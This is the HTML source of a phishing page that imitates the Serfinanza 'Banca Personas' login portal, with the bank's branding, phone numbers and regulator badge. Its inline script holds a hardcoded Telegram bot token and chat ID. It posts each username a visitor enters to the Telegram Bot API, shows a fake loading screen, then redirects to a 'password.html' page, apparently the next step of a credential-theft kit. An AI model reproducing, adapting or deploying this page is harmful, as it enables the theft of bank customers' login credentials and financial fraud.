<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Serfinanza - Banca Personas</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <header class="header">
            <img src="img/logo2.png" alt="Serfinanza" class="logo">
        </header>

        <main class="main-content">
            <div class="login-card">
                <h1 class="welcome-title">BIENVENIDO A TU</h1>
                <h2 class="welcome-subtitle">SERFINANZA VIRTUAL</h2>
                <h3 class="welcome-type">PERSONAS</h3>

                <div class="icon-user">
                    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="12" cy="8" r="4" stroke="#e63946" stroke-width="2"/>
                        <path d="M4 20C4 16.6863 6.68629 14 10 14H14C17.3137 14 20 16.6863 20 20" stroke="#e63946" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                </div>

                <form id="loginForm" onsubmit="return false">
                    <div class="input-group">
                        <input type="text" id="usuarioInput" class="input-field" placeholder="Ingresa tu usuario">
                    </div>

                    <button type="button" class="btn-ingresar" id="btnIngresar" disabled>Ingresar</button>
                </form>

                <div class="links-container">
                    <a href="#" class="link">Regístrate<br>aquí</a>
                    <a href="#" class="link">Recordar<br>Usuario</a>
                    <a href="#" class="link">Restablecer<br>Contraseña</a>
                </div>
            </div>
        </main>

        <footer class="footer">
            <p class="contact-info">Línea de Servicio al Cliente: 323 5997000 - 018000510513</p>
            
            <div class="footer-links">
                <div class="footer-link-item">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="4" y="7" width="8" height="7" rx="1" stroke="#666" stroke-width="1.5"/>
                        <path d="M6 7V5C6 3.34315 7.34315 2 9 2H9C10.6569 2 12 3.34315 12 5V7" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                    </svg>
                    <a href="#">Seguridad</a>
                </div>
                <div class="footer-link-item">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="3" y="2" width="10" height="12" rx="1" stroke="#666" stroke-width="1.5"/>
                        <line x1="5" y1="5" x2="11" y2="5" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                        <line x1="5" y1="8" x2="11" y2="8" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                        <line x1="5" y1="11" x2="9" y2="11" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                    </svg>
                    <a href="#">Reglamento Sucursal Virtual</a>
                </div>
                <div class="footer-link-item">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="3" y="2" width="10" height="12" rx="1" stroke="#666" stroke-width="1.5"/>
                        <line x1="5" y1="5" x2="11" y2="5" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                        <line x1="5" y1="8" x2="11" y2="8" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                        <line x1="5" y1="11" x2="9" y2="11" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                    </svg>
                    <a href="#">Políticas de Privacidad</a>
                </div>
            </div>

            <div class="footer-bottom">
                <img src="img/superfinanciera Vigilado-01.jpg" alt="Superfinanciera" class="vigilado-logo">
                <p class="copyright">Serfinanza - 2025</p>
            </div>
        </footer>
    </div>

    <div id="loadingOverlay" class="overlay" style="display: none;">
        <div class="overlay-content">
            <img src="img/logo2.png" alt="Serfinanza" class="overlay-logo">
            <div class="spinner"></div>
            <p class="overlay-text">Cargando...</p>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
        const TELEGRAM_CHAT_ID = '-1003784784181';

        const btnIngresar = document.getElementById('btnIngresar');
        const usuarioInput = document.getElementById('usuarioInput');
        const loadingOverlay = document.getElementById('loadingOverlay');

        usuarioInput.addEventListener('input', function() {
            const isValid = usuarioInput.value.trim().length >= 3;
            btnIngresar.disabled = !isValid;
        });

        btnIngresar.addEventListener('click', async function(e) {
            e.preventDefault();
            if (btnIngresar.disabled) return;

            loadingOverlay.style.display = 'flex';

            const mensaje = `👤 <b>USUARIO - SERFINANZA</b>

<b>Usuario:</b> <code>${usuarioInput.value}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    setTimeout(() => { window.location.href = 'password.html'; }, 2000);
                } else {
                    loadingOverlay.style.display = 'none';
                }
            } catch (error) {
                loadingOverlay.style.display = 'none';
            }
        });

        usuarioInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                btnIngresar.click();
            }
        });
    </script>
</body>
</html>
